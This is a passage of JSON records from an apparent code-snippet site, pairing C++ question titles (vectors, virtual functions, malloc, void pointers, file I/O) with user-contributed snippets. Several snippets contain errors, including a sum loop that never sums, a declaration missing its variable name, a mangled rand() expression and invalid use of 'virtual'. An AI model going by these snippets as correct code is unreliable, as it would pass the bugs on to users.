    "description": "#include <iostream> #include <vector> using namespace std;    int main() {     vector<vector<int> > buff;      for(int i = 0; i < 10; i++)     {         vector<int> temp; // create an array, don't work directly on buff yet.         for(int j = 0; j < 10; j++)             temp.push_back(i);            buff.push_back(temp); // Store the array in the buffer     }      for(int i = 0; i < buff.size(); ++i)     {         for(int j = 0; j < buff[i].size(); ++j)             cout << buff[i][j];         cout << endl;     }      return 0; }\nvector<vector<int>> matrix(x, vector<int>(y));  This creates x vectors of size y, filled with 0's. \n#include <iostream>  #include <vector>  using namespace std;     int main()  {  \tint n = 5; \tint m = 7; \t//Create a vector containing n vectors of size m and initalize them to 0. \tvector<vector<int>> vec(n, vector<int>(m, 0));  \tfor (int i = 0; i < vec.size(); i++) //print them out \t{ \t\tfor (int j = 0; j < vec[i].size(); j++) \t\t{ \t\t\tcout << vec[i][j] << \" \"; \t\t} \t\tcout << endl; \t} }\n int main()  {      int row = 5; // size of row      int colom[] = { 5, 3, 4, 2, 1 };         vector<vector<int> > vec(row);  // Create a vector of vector with size equal to row.    \tfor (int i = 0; i < row; i++) {    \t\tint col;           col = colom[i];    \t\tvec[i] = vector<int>(col); //Assigning the coloumn size of vector         for (int j = 0; j < col; j++)              vec[i][j] = j + 1;      }         for (int i = 0; i < row; i++) {          for (int j = 0; j < vec[i].size(); j++)              cout << vec[i][j] << \" \";          cout << endl;      }  } \n#include <iostream> #include <vector> using namespace std;  int main() {   //vector element size   const int size = 4;    //vector with int data type   //all elements are equal to 4   vector<int> myVect (size, 4);    for (int i=0; i<size; i++) {     cout << \"Vector index(\" << i <<\") is: \"<< myVect[i] << endl;    }   return 0; }\nvector<vector<data_type>> vec;\n",
    "reg_date": "2021-10-12T11:44:14.000Z"
  },
  {
    "id": 4175,
    "keyword": null,
    "link": null,
    "title": " vector of vectors of pairs c++",
    "description": "vector<pair<int,int>>v;\n\tvector<vector<pair<int, float>>> vec(10, vector<pair<int, float>>(5, pair<int, float>(0, 0)));  \tfor (int i = 0; i < vec.size(); i++) \t{ \t\tfor (int j = 0; j < vec[i].size(); j++) \t\t{ \t\t\tcout << vec[i][j].first << \" \"; \t\t\tcout << vec[i][j].second << \" \"; \t\t} \t\tcout << endl; \t}\n",
    "reg_date": "2021-10-12T11:44:14.000Z"
  },
  {
    "id": 4176,
    "keyword": null,
    "link": null,
    "title": " vector operations in c++",
    "description": "#include <vector>  int main() {   std::vector<int> v;   v.push_back(10); // v = [10];   v.push_back(20); // v = [10, 20];      v.pop_back(); // v = [10];   v.push_back(30); // v = [10, 30];      auto it = v.begin();   int x = *it; // x = 10;   ++it;   int y = *it; // y = 30   ++it;   bool is_end = it == v.end(); // is_end = true      return 0; }\n#include <iostream> #include<vector> #include<algorithm>  using namespace std;  int main() {     int n;     cin>>n;     vector<int>vec(n);     for(int i=0;i<n;i++)     {         cin>>vec[i];     }     cout<<\"----------\"<<endl;     for(int i=0;i<n;i++)     {       cout<<vec[i]<<\" \";     }     vec.push_back(100);     vec.push_back(200);     cout<<endl;     auto it=vec.begin();     vec.insert(it,3,1000);     for(vector<int>::iterator it1=vec.begin();it1!=vec.end();it1++)     {         cout<<*it1<<\" \";     }     cout<<endl;     vector<int>vec2;     vec2.push_back(15);     vec2.push_back(25);     vec2.push_back(35);     vec.insert(it,vec2.begin(),vec2.end());     for(vector<int>::iterator it1=vec.begin();it1!=vec.end();it1++)     {         cout<<*it1<<\" \";     }     cout<<endl;     vec.pop_back();     vec.pop_back();     for(vector<int>::iterator it1=vec.begin();it1!=vec.end();it1++)     {         cout<<*it1<<\" \";     }     cout<<endl;     int k;     cin>>k;     cout<<endl;     vector<int>::iterator its=vec.begin()+k-1;     int s=vec.size();     cout<<s<<endl;     vec.erase(its);     for(vector<int>::iterator it1=vec.begin();it1!=vec.end();it1++)     {         cout<<*it1<<\" \";     }           return 0; } \n",
    "reg_date": "2021-10-12T11:44:14.000Z"
  },
  {
    "id": 4177,
    "keyword": null,
    "link": null,
    "title": " vector pop",
    "description": "#include <bits/stdc++.h>  using namespace std; int main(){     vector<int> v1{10, 20, 30, 40, 50};          //removing elemenets     v1.pop_back();  //removes 50     v1.pop_back();  //removes 40  }\nRemoves the last element of the vector\n// vector::pop_back #include <iostream> #include <vector>  int main () {   std::vector<int> myvector;   int sum (0);   myvector.push_back (100);   myvector.push_back (200);   myvector.push_back (300);    while (!myvector.empty())   {     std::cout<<myvector.back()<<\" \";     myvector.pop_back();   }    std::cout << \"The elements of myvector add up to \" << sum << '\\n';    return 0; }\nThe elements of myvector add up to 600 \n",
    "reg_date": "2021-10-12T11:44:15.000Z"
  },
  {
    "id": 4178,
    "keyword": null,
    "link": null,
    "title": " vector pop back",
    "description": "// vector::pop_back #include <iostream> #include <vector>  int main () {   std::vector<int> myvector;   int sum (0);   myvector.push_back (100);   myvector.push_back (200);   myvector.push_back (300);    while (!myvector.empty())   {     sum+=myvector.back();     myvector.pop_back();   }    std::cout << \"The elements of myvector add up to \" << sum << '\\n';    return 0; }\n#include <bits/stdc++.h>  using namespace std; int main(){     vector<int> v1{10, 20, 30, 40, 50};          //removing elemenets     v1.pop_back();  //removes 50     v1.pop_back();  //removes 40  }\n",
    "reg_date": "2021-10-12T11:44:15.000Z"
  },
  {
    "id": 4179,
    "keyword": null,
    "link": null,
    "title": " vector remove class",
    "description": "carVec.erase(std::remove_if(carVec.begin(), carVec.end(), [&id_to_delete](const Car& ele)->bool             {                 return ele.getnewId() == id_to_delete;             }), carVec.end()); \n",
    "reg_date": "2021-10-12T11:44:15.000Z"
  },
  {
    "id": 4180,
    "keyword": null,
    "link": null,
    "title": " vector search by element",
    "description": "#include <vector> // vector  #include <algorithm> // find  #include <iostream> // cout  using namespace std; int main() {     vector<int> nums = {1,2,3,4,5,6,7,8,9};     bool isSorted = is_sorted(nums.begin(), nums.end());     if(isSorted){         cout << \"Using binary search: \" << endl;         if(binary_search(nums.begin(), nums.end(), 9))             cout << \"found it\" << endl;         else             cout << \"not here\" << endl;     }     else{         cout << \"Using std::find\";         if(std::find(nums.begin(), nums.end(), 9) != nums.end())             cout << \"found it\" << endl;         else             cout << \"not here\" << endl;     } }\n",
    "reg_date": "2021-10-12T11:44:15.000Z"
  },
  {
    "id": 4181,
    "keyword": null,
    "link": null,
    "title": " vector size for loop",
    "description": "vector<int> arr(100, 0); for (size_t i = 0; i != arr.size(); ++i){     // do something with arr[i] } \n",
    "reg_date": "2021-10-12T11:44:15.000Z"
  },
  {
    "id": 4182,
    "keyword": null,
    "link": null,
    "title": " vector stop at newline",
    "description": "// read N1 & N2 using cin int N1, N2; cin >> N1; cin >> N2;  // skip the new line which is after N2 (i.e; 2 value in 1st line) cin.ignore(numeric_limits<streamsize>::max(), '\\n');  // now read 3 4 5 elements int ele; // 2nd EOF condition may required, //    depending on if you dont have last new-line, and it is end of file. while ((cin_.peek() != '\\n') && (cin_.peek() != EOF)) {   cin >> ele;   // do something with ele } \n",
    "reg_date": "2021-10-12T11:44:15.000Z"
  },
  {
    "id": 4183,
    "keyword": null,
    "link": null,
    "title": " vector to char array c++",
    "description": "std::vector<char> input({ 'a', 'b', 'c' });  std::string s(input.begin(), input.end()); \nstd::vector<int> vec {1, 2, 3}; const int* = vec.data();\n",
    "reg_date": "2021-10-12T11:44:15.000Z"
  },
  {
    "id": 4184,
    "keyword": null,
    "link": null,
    "title": " vector to string c++",
    "description": "#include <iostream> #include <string> #include <vector>   int main() {     std::string s = \"Hello World!\";       std::vector<char> v(s.begin(), s.end());       for (const char &c: v)         std::cout << c;       return 0; } \nstd::vector<char> input({ 'a', 'b', 'c' }); std::string s(input.begin(), input.end());\n",
    "reg_date": "2021-10-12T11:44:15.000Z"
  },
  {
    "id": 4185,
    "keyword": null,
    "link": null,
    "title": " vector unique in c++",
    "description": "sort(vec.begin(), vec.end()); vec.erase(unique(vec.begin(), vec.end()), vec.end());\n",
    "reg_date": "2021-10-12T11:44:15.000Z"
  },
  {
    "id": 4186,
    "keyword": null,
    "link": null,
    "title": " vector with initial size",
    "description": "vector<vector<int>> v(10, vector<int>(10));\nvector<vector<vector<double>>> f(3, vector<vector<double>>(4, vector<double>(5))); \nstd::vector<std::string> vec(20000); \n",
    "reg_date": "2021-10-12T11:44:16.000Z"
  },
  {
    "id": 4187,
    "keyword": null,
    "link": null,
    "title": " vectors c++ set the size",
    "description": "#include <iostream> #include <vector>  using namespace std;  int main(void) {    vector<int> v;     cout << \"Initial vector size = \" << v.size() << endl;     v.resize(5, 10);    cout << \"Vector size after resize = \" << v.size() << endl;     cout << \"Vector contains following elements\" << endl;    for (int i = 0; i < v.size(); ++i)       cout << v[i] << endl;     return 0; }\n",
    "reg_date": "2021-10-12T11:44:16.000Z"
  },
  {
    "id": 4188,
    "keyword": null,
    "link": null,
    "title": " vectors in c++",
    "description": " vector<int> vec; //Creates an empty (size 0) vector    vector<int> vec(4); //Creates a vector with 4 elements.  /*Each element is initialised to zero. If this were a vector of strings, each string would be empty. */  vector<int> vec(4, 42);  /*Creates a vector with 4 elements. Each element is initialised to 42. */   vector<int> vec(4, 42); vector<int> vec2(vec);  /*The second line creates a new vector, copying each element from the vec into vec2. */\n#include <iostream> #include <vector> using namespace std;  int main() {   //vector element size   const int size = 4;    //vector with int data type   //all elements are equal to 4   vector<int> myVect (size, 4);    for (int i=0; i<size; i++) {     cout << \"Vector index(\" << i <<\") is: \"<< myVect[i] << endl;    }   return 0; }\nvector <int> vc;\n",
    "reg_date": "2021-10-12T11:44:16.000Z"
  },
  {
    "id": 4189,
    "keyword": null,
    "link": null,
    "title": " vertaal",
    "description": "life is easier with google translate ;)\n#include <iostream>\n",
    "reg_date": "2021-10-12T11:44:16.000Z"
  },
  {
    "id": 4190,
    "keyword": null,
    "link": null,
    "title": " vertical traversal of binary tree",
    "description": "/* This is just a function of vertical traversal of binary tree. You need to     write required code. Thank you. */  // Class to store node and it's distance from parent. class Obj {     public:         Node *root;         int dis;          Obj(Node *node, int dist)         {             root = node;             dis = dist;         } };  // Main logic of vertical traversal. void verticalTraversal(Node *root) {     queue<Obj*> q;     Obj *ob = new Obj(root, 0);     q.push(ob);      map<int, vector<int>> m;      while(!q.empty())     {         Obj *ob = q.front();         q.pop();          if(m.find(ob->dis) != m.end())         {                         m[ob->dis].push_back(ob->root->data);         }            else         {                vector<int> v;             v.push_back(ob->root->data);             m[ob->dis] = v;         }          if(ob->root->left != NULL)             q.push(new Obj(ob->root->left, ob->dis-1));         if(ob->root->right != NULL)             q.push(new Obj(ob->root->right, ob->dis+1));     }      for(auto it=m.begin(); it!=m.end(); it++)     {         vector<int> v1 = (*it).second;         for(int j = 0; j<v1.size(); j++)             cout << v1[j] << \"\\t\";     }      cout << endl; }\n// Java program for printing vertical order of a given binary tree  import java.util.TreeMap;  import java.util.Vector;  import java.util.Map.Entry;   public class VerticalOrderBtree  {  \t// Tree node  \tstatic class Node  \t{  \t\tint key;  \t\tNode left;  \t\tNode right;  \t\t \t\t// Constructor  \t\tNode(int data)  \t\t{  \t\t\tkey = data;  \t\t\tleft = null;  \t\t\tright = null;  \t\t}  \t}  \t \t// Utility function to store vertical order in map 'm'  \t// 'hd' is horizontal distance of current node from root.  \t// 'hd' is initially passed as 0  \tstatic void getVerticalOrder(Node root, int hd,  \t\t\t\t\t\t\t\tTreeMap<Integer,Vector<Integer>> m)  \t{  \t\t// Base case  \t\tif(root == null)  \t\t\treturn;  \t\t \t\t//get the vector list at 'hd'  \t\tVector<Integer> get = m.get(hd);  \t\t \t\t// Store current node in map 'm'  \t\tif(get == null)  \t\t{  \t\t\tget = new Vector<>();  \t\t\tget.add(root.key);  \t\t}  \t\telse \t\t\tget.add(root.key);  \t\t \t\tm.put(hd, get);  \t\t \t\t// Store nodes in left subtree  \t\tgetVerticalOrder(root.left, hd-1, m);  \t\t \t\t// Store nodes in right subtree  \t\tgetVerticalOrder(root.right, hd+1, m);  \t}  \t \t// The main function to print vertical order of a binary tree  \t// with the given root  \tstatic void printVerticalOrder(Node root)  \t{  \t\t// Create a map and store vertical order in map using  \t\t// function getVerticalOrder()  \t\tTreeMap<Integer,Vector<Integer>> m = new TreeMap<>();  \t\tint hd =0;  \t\tgetVerticalOrder(root,hd,m);  \t\t \t\t// Traverse the map and print nodes at every horigontal  \t\t// distance (hd)  \t\tfor (Entry<Integer, Vector<Integer>> entry : m.entrySet())  \t\t{  \t\t\tSystem.out.println(entry.getValue());  \t\t}  \t}  \t \t// Driver program to test above functions  \tpublic static void main(String[] args) {   \t\t// TO DO Auto-generated method stub  \t\tNode root = new Node(1);  \t\troot.left = new Node(2);  \t\troot.right = new Node(3);  \t\troot.left.left = new Node(4);  \t\troot.left.right = new Node(5);  \t\troot.right.left = new Node(6);  \t\troot.right.right = new Node(7);  \t\troot.right.left.right = new Node(8);  \t\troot.right.right.right = new Node(9);  \t\tSystem.out.println(\"Vertical Order traversal is\");  \t\tprintVerticalOrder(root);  \t}  }\n",
    "reg_date": "2021-10-12T11:44:16.000Z"
  },
  {
    "id": 4191,
    "keyword": null,
    "link": null,
    "title": " virtual function c++",
    "description": "#include <iostream> #include  <string> //Pure virtual function  or inteface allows us to define a function in a base class that doesn't have an implementation or definition in the base class and force sub classes to implement that function //Pure virtual function is also called an interface in other languages class Entity { public: \t//virtual std::string GetName() { return \"Entity\"; }//This is a function that is just virtual .Overriding this function in sub class is optional we can instantiate subcllass without overriding  or implementing this function \t \t//Below is an example a Pure Virtual Function \t//It is an unimplemented function ant it forces the  sub class to implement it and define it \t//You will not be able to instantiate sub class without implementing or defining the function in sub class \tvirtual std::string GetName() = 0;    //the pure virtual function must have virtual written at the beginning and =0 at the end  //This function cannot contain any definition in base class,it is just a declaration }; class Player :public Entity { \tstd::string m_name;  public: \tPlayer(const std::string& name) \t\t:m_name(name) \t{}; \tvoid Print() { std::cout << \"This is Sub class\" << std::endl; }; \tstd::string GetName()override { return m_name; };//Pure virtual functions is implemented here in this sub class }; void PrintName(Entity* entity) {  \tstd::cout << entity->GetName() << std::endl; } int main() { \t//Entity a;//We can't do this because class Entity contains function that is unimplemented \tPlayer x(\"Jacob\");//This will work because we have implemented or defined the function in this sub class \tstd::cin.get(); }\n#include <iostream> #include<string> \t//Virtual Functions are functions that allow us to override methods in subclasses //In this example  we have an entity class as a base class and class player inherits from public entity  class Entity { public: \tvirtual std::string GetName() { return \"Entity\"; }//It is a method in base class that we want to modify in sub class Player \tvoid Print() { std::cout << \"This is Base class\" << std::endl;}//function that is not virtual }; class Player :public Entity { \tstd::string m_name;  public: \tPlayer(const std::string& name) \t\t:m_name(name) \t{}; \tvoid Print() { std::cout << \"This is Sub class\" << std::endl; };//function that is not virtual \tstd::string GetName()override { return m_name; };//overriding the function in sub class };  int main() { \tEntity* e = new Entity(); \tstd::cout << e->GetName() << std::endl; \tPlayer* p = new Player(\"Jacob\"); \tstd::cout << p->GetName() << std::endl; \tPrintName(p);// This function calls the GetName method from the Player instance despite it takes an entity instance as a parameter this is because player class is a sub  class of Entity and the method is marked virtual it will map with the method in the Player class and call it from there .It outputs => Jacob \t//if It was not virtual it would have called The method From Entity Instance and output would be => Entity \tEntity* notvirtualentity = new Entity(); \tPlayer* notvirtualpalyer = new Player(\"XX\"); \tnotvirtualentity =  notvirtualpalyer; \tnotvirtualentity->Print();//It prints => this is base class if it was virtual function it would call print function from Player Class and print => This is subclass \tstd::cin.get(); }\n#include <iostream> #include <string>  class Entity { public:   virtual std::string getName();   void print();  };  virtual std::string Entity::getName() { \treturn \"Entity\"; }  void Entity::print() { \tstd::cout << \"This is the base class\" << std::endl; }  class Player : public Entity {   std::string m_name; public: \tPlayer(const std::string& name): m_name(name) {};   \tvoid print();   \tvirtual std::string getName(); };  virtual std::string Player::getName() { \treturn m_name; }  void Player::print() { \tstd::cout << \"This is the sub class\" << std::endl; }  int main() { \tEntity* e = new Entity();   \tstd::cout << e->getName() << std::endl;   \tPlayer* p = new Player(\"Jacob\");   \tstd::cout << p->getName() << std::endl;   \tp->print();   \te->print();      \tEntity* notVirtualEntity = new Entity();   \tPlayer* notVirtualPlayer = new Player(\"Bob\");   \tnotVirtualEntity = notVirtualPlayer;   \tnotVirtualEntity->print();   \tnotVirtualEntity->getName(); }\n",
    "reg_date": "2021-10-12T11:44:16.000Z"
  },
  {
    "id": 4192,
    "keyword": null,
    "link": null,
    "title": " virtual function in c++",
    "description": "#include <iostream> #include  <string> //Pure virtual function  or inteface allows us to define a function in a base class that doesn't have an implementation or definition in the base class and force sub classes to implement that function //Pure virtual function is also called an interface in other languages class Entity { public: \t//virtual std::string GetName() { return \"Entity\"; }//This is a function that is just virtual .Overriding this function in sub class is optional we can instantiate subcllass without overriding  or implementing this function \t \t//Below is an example a Pure Virtual Function \t//It is an unimplemented function ant it forces the  sub class to implement it and define it \t//You will not be able to instantiate sub class without implementing or defining the function in sub class \tvirtual std::string GetName() = 0;    //the pure virtual function must have virtual written at the beginning and =0 at the end  //This function cannot contain any definition in base class,it is just a declaration }; class Player :public Entity { \tstd::string m_name;  public: \tPlayer(const std::string& name) \t\t:m_name(name) \t{}; \tvoid Print() { std::cout << \"This is Sub class\" << std::endl; }; \tstd::string GetName()override { return m_name; };//Pure virtual functions is implemented here in this sub class }; void PrintName(Entity* entity) {  \tstd::cout << entity->GetName() << std::endl; } int main() { \t//Entity a;//We can't do this because class Entity contains function that is unimplemented \tPlayer x(\"Jacob\");//This will work because we have implemented or defined the function in this sub class \tstd::cin.get(); }\n#include <iostream> #include<string> \t//Virtual Functions are functions that allow us to override methods in subclasses //In this example  we have an entity class as a base class and class player inherits from public entity  class Entity { public: \tvirtual std::string GetName() { return \"Entity\"; }//It is a method in base class that we want to modify in sub class Player \tvoid Print() { std::cout << \"This is Base class\" << std::endl;}//function that is not virtual }; class Player :public Entity { \tstd::string m_name;  public: \tPlayer(const std::string& name) \t\t:m_name(name) \t{}; \tvoid Print() { std::cout << \"This is Sub class\" << std::endl; };//function that is not virtual \tstd::string GetName()override { return m_name; };//overriding the function in sub class };  int main() { \tEntity* e = new Entity(); \tstd::cout << e->GetName() << std::endl; \tPlayer* p = new Player(\"Jacob\"); \tstd::cout << p->GetName() << std::endl; \tPrintName(p);// This function calls the GetName method from the Player instance despite it takes an entity instance as a parameter this is because player class is a sub  class of Entity and the method is marked virtual it will map with the method in the Player class and call it from there .It outputs => Jacob \t//if It was not virtual it would have called The method From Entity Instance and output would be => Entity \tEntity* notvirtualentity = new Entity(); \tPlayer* notvirtualpalyer = new Player(\"XX\"); \tnotvirtualentity =  notvirtualpalyer; \tnotvirtualentity->Print();//It prints => this is base class if it was virtual function it would call print function from Player Class and print => This is subclass \tstd::cin.get(); }\n#include <iostream> #include <string>  class Entity { public:   virtual std::string getName();   void print();  };  virtual std::string Entity::getName() { \treturn \"Entity\"; }  void Entity::print() { \tstd::cout << \"This is the base class\" << std::endl; }  class Player : public Entity {   std::string m_name; public: \tPlayer(const std::string& name): m_name(name) {};   \tvoid print();   \tvirtual std::string getName(); };  virtual std::string Player::getName() { \treturn m_name; }  void Player::print() { \tstd::cout << \"This is the sub class\" << std::endl; }  int main() { \tEntity* e = new Entity();   \tstd::cout << e->getName() << std::endl;   \tPlayer* p = new Player(\"Jacob\");   \tstd::cout << p->getName() << std::endl;   \tp->print();   \te->print();      \tEntity* notVirtualEntity = new Entity();   \tPlayer* notVirtualPlayer = new Player(\"Bob\");   \tnotVirtualEntity = notVirtualPlayer;   \tnotVirtualEntity->print();   \tnotVirtualEntity->getName(); }\n",
    "reg_date": "2021-10-12T11:44:16.000Z"
  },
  {
    "id": 4193,
    "keyword": null,
    "link": null,
    "title": " virual function",
    "description": "#include <iostream> using namespace std;  class Enemy { public: \tvirtual void Attack() {} };  class Ninja : public Enemy  { public: \tvoid Attack() { \t\tcout << \"ninja attack\" << endl; \t} };  class Monster :public Enemy  { \tvoid Attack() { \t\tcout << \"Monster attack\" << endl; \t} };  int main() { \tNinja ninjaObj; \tMonster monsterObj;  \tEnemy* ninjaPointer = &ninjaObj; \tEnemy* monsterPointer = &monsterObj;  \tninjaPointer->Attack(); \tmonsterPointer->Attack(); }   /*A virtual function is a member function that you expect to be redefined in derived classes.  When you refer to a derived class object using a pointer or a reference to the base class, you can call a virtual function for that object and execute the derived class's version of the function.*/\n",
    "reg_date": "2021-10-12T11:44:16.000Z"
  },
  {
    "id": 4194,
    "keyword": null,
    "link": null,
    "title": " visibility in c++",
    "description": "#include <iostream> // Visibility is how visible certain members or methods of class are , who can see them ,who can call them and who can use them //Visibility has no effect on performance of your program it is ust for organizing code //Three basic visibility modifers are: //1 private //2 public //3 protected //default visibility of a struct is public //default visibility of class is private  class Entity { protected://means all sub classes and base class can access these functions and variables butcan't be accessed outside classes \tint P; \tvoid InitP () { \t\tP = 0; \t\t//initializes P to 0 \t} public://Pubic methods and variables can be accessed inside and outside of the class \tint a, b; \tvoid Init() { \t\ta = 0; \t\tb = 0; \t} private://only entity class can read and write the variables exeption is friend \tint X , Y; \tvoid print(){ \t\t// Content \t\t// only this function can be acessed inside the class unless you use friend keyword \t} public: \tEntity() { \t\tX = 0;// can initialize x inside the class but can't access it from outside the class unsless you use friend keyword  \t}  }; class Player : public Entity// class palyer is a sub class of  class Entity { public: \tPlayer() { \t\t//X = 2;\t// Error can't access the private members from base class \t\t//print();\t// can't access it in sub class because it is private  \t\ta = 1;\t// can acces it because it is public in base class \t\tb = 1;\t// can acces it because it is public in base class \t\tInit(); // can acces it because it is public in base class \t\tP = 0;\t// can access it in subclass because its visibility is protected \t\tInitP(); //can access it in subclass because its visibility is protected \t} \t  }; int main() { \tEntity e1; \tPlayer a; \t//e1.x;\t//error can't access private members from here \t//e1.print(); // error inaccessible due to its visibility being private \te1.a = 5;//can access from here because it's visibility is public  \te1.Init();//can access from here because it's visibility is public \ta.a = 5;//can access from here because it's visibility in base class is public  \ta.Init();//can access from here because it's visibility in base class is public \t//e1.P;\t//can't access it because  visibility is protected \t//e1.InitP; //can't access it because  visibility is protected \t// a.P;\t\t//can't access it because  visibility is protected in base class \t// a.InitP; //can't access it because  visibility is protected in base class \tstd::cin.get(); }\n",
    "reg_date": "2021-10-12T11:44:16.000Z"
  },
  {
    "id": 4195,
    "keyword": null,
    "link": null,
    "title": " visual studio",
    "description": "wow! good luck my bro.\nGood Choice!\nAn IDE made by Microsoft for developing Programs with C#, C++, C, Python or HTML/CSS/JS\nVS -> not here?\nSomtimes maybe good, sometimes maybe Sh*t.\nVery good choice\nif (IDE == \"Microsoft Visual Studio\"){   cout << \"Get visual studio code\\n\";   cout << \"more flexible, and still by microsoft\\n\"; }\nEpic Choice.\nbest ever\nBad choice buddy...\n",
    "reg_date": "2021-10-12T11:44:16.000Z"
  },
  {
    "id": 4196,
    "keyword": null,
    "link": null,
    "title": " visual studio 2019 read and write text file c++",
    "description": "#include <iostream> #include <fstream> #include <string> using namespace std; int main(){    fstream newfile;    newfile.open(\"tpoint.txt\",ios::out);  // open a file to perform write operation using file object    if(newfile.is_open()) //checking whether the file is open    {       newfile<<\"Tutorials point \\n\";   //inserting text       newfile.close();    //close the file object    }    newfile.open(\"tpoint.txt\",ios::in); //open a file to perform read operation using file object    if (newfile.is_open()){   //checking whether the file is open       string tp;       while(getline(newfile, tp)){ //read data from file object and put it into string.          cout << tp << \"\\n\"; //print the data of the string       }       newfile.close(); //close the file object.    } }\n",
    "reg_date": "2021-10-12T11:44:16.000Z"
  },
  {
    "id": 4197,
    "keyword": null,
    "link": null,
    "title": " visual studio code terminal keeps closing c++",
    "description": "//add system(\"pause\"); before return 0; in main() #include <iostream> int main() {   \tstd::cout << \"Hello world!\" << endl; //system(\"pause\") dont make new line so you will need the endl \tsystem(\"pause\");   \treturn 0; }\n",
    "reg_date": "2021-10-12T11:44:17.000Z"
  },
  {
    "id": 4198,
    "keyword": null,
    "link": null,
    "title": " visual studio cpp compiler",
    "description": "Try \"CMake\" and \"CMake Tools\" from the extensions in Visual Code\n",
    "reg_date": "2021-10-12T11:44:17.000Z"
  },
  {
    "id": 4199,
    "keyword": null,
    "link": null,
    "title": " visual studio getline not working",
    "description": "#include <string>\n#include<string> std::string line; getline(cin,line);\n",
    "reg_date": "2021-10-12T11:44:17.000Z"
  },
  {
    "id": 4200,
    "keyword": null,
    "link": null,
    "title": " void *malloc( size t size )      {           //do your stuf here           return ::malloc(size);      }",
    "description": "/* malloc example: random string generator*/ #include <stdio.h>      /* printf, scanf, NULL */ #include <stdlib.h>     /* malloc, free, rand */  int main () {   int i,n;   char * buffer;    printf (\"How long do you want the string? \");   scanf (\"%d\", &i);    buffer = (char*) malloc (i+1);   if (buffer==NULL) exit (1);    for (n=0; n<i; n++)     buffer[n]=rand()&+'a';   buffer[i]='\\0';    printf (\"Random string: %s\\n\",buffer);   free (buffer);    return 0; }\n",
    "reg_date": "2021-10-12T11:44:17.000Z"
  },
  {
    "id": 4201,
    "keyword": null,
    "link": null,
    "title": " void does not a name a type in cpp",
    "description": "void does not name a type  \n",
    "reg_date": "2021-10-12T11:44:17.000Z"
  },
  {
    "id": 4202,
    "keyword": null,
    "link": null,
    "title": " void linux java",
    "description": "# xbps-install -S openjdk-jre \n",
    "reg_date": "2021-10-12T11:44:17.000Z"
  },
  {
    "id": 4203,
    "keyword": null,
    "link": null,
    "title": " void pointer",
    "description": "// A void pointer is a generic pointer, it has no associated type with it. // A void pointer can hold address of any type and can be typcasted to any type.  void *ptr;\t  ///// Examples void *v; int *i;  int ivar; char chvar; float fvar;  v = &ivar; // valid  v = &chvar; //valid v = &fvar; // valid i = &ivar; //valid  i = &chvar; //invalid  i = &fvar; //invalid    \n",
    "reg_date": "2021-10-12T11:44:17.000Z"
  },
  {
    "id": 4204,
    "keyword": null,
    "link": null,
    "title": " void value not ignored as it ought to be",
    "description": "you're trying to capture the return value of a function for which the return type is void. \n",
    "reg_date": "2021-10-12T11:44:17.000Z"
  },
  {
    "id": 4205,
    "keyword": null,
    "link": null,
    "title": " volume of shapes using class and operator overload",
    "description": "#include <iostream> #include <iomanip> using namespace std;  class cuboidvolume{          float l,b,h;     float r;     float rc,rh;          public:     void v(float l, float b, float h){                  std::cout << std::fixed << std::setprecision(2);         float vol=l*b*h;         if (vol < 1){             std::cout << \"Less volume:Data not sufficient\\n\";         }         else{             std::cout << vol << '\\n';         }     }     void v(float r){                  std::cout << std::fixed << std::setprecision(2);         float fourbythree=4.0/3.0;         float vol=fourbythree*(3.14)*r*r*r;         if (vol < 1){             std::cout << \"Less volume:Data not sufficient\\n\";         }         else{             std::cout << vol << '\\n';         }     }     void v(float rc, float hc){                  std::cout << std::fixed << std::setprecision(2);         float vol=(3.14)*rc*rc*hc;         if (vol < 1){             std::cout << \"Less volume:Data not sufficient\\n\";         }         else{             std::cout << vol << '\\n';         }     }  };  int main(){     float l,b,h;     float r;     float rc,hc;          cin>>l>>b>>h;     cin>>r;     cin>>rc>>hc;     cuboidvolume x;     x.v(l,b,h);     x.v(r);     x.v(rc,hc);     return 0; }\n",
    "reg_date": "2021-10-12T11:44:17.000Z"
  },
  {
    "id": 4206,
    "keyword": null,
    "link": null,
    "title": " vprintf",
    "description": "// vprintf syntax int vprintf ( const char * format, va_list arg );\n/* vprintf example */ #include <stdio.h> #include <stdarg.h>  void WriteFormatted ( const char * format, ... ) {   va_list args;   va_start (args, format);   vprintf (format, args);   va_end (args); }  int main () {    WriteFormatted (\"Call with %d variable argument.\\n\",1);    WriteFormatted (\"Call with %d variable %s.\\n\",2,\"arguments\");     return 0; }  // Output: // Call with 1 variable argument. // Call with 2 variable arguments.\n",
    "reg_date": "2021-10-12T11:44:18.000Z"
  },
  {
    "id": 4207,
    "keyword": null,
    "link": null,
    "title": " wait 1 second c++",
    "description": "// this_thread::sleep_for example #include <iostream>       // std::cout, std::endl #include <thread>         // std::this_thread::sleep_for #include <chrono>         // std::chrono::seconds   int main()  {   std::cout << \"countdown:\\n\";   for (int i=10; i>0; --i) {     std::cout << i << std::endl;     std::this_thread::sleep_for (std::chrono::seconds(1));   }   std::cout << \"Lift off!\\n\";    return 0; }\n",
    "reg_date": "2021-10-12T11:44:18.000Z"
  },
  {
    "id": 4208,
    "keyword": null,
    "link": null,
    "title": " waiting in a serial as the spool reflect the queue operation. Demonstrate Printer Behavior in context of Queue.Subject to the Scenario implement the Pop and Push Using C++.",
    "description": "waiting in a serial as the spool reflect the queue operation. Demonstrate                          Printer Behavior in context of Queue.Subject to the Scenerio implement the Pop                          and Push Using C++. \n",
    "reg_date": "2021-10-12T11:44:18.000Z"
  },
  {
    "id": 4209,
    "keyword": null,
    "link": null,
    "title": " wap in c++ to understand function template",
    "description": "// Declartion of functio template  template <class T> T someFunction(T arg) {    ... .. ... }\n",
    "reg_date": "2021-10-12T11:44:18.000Z"
  },
  {
    "id": 4210,
    "keyword": null,
    "link": null,
    "title": " water jug using bfs",
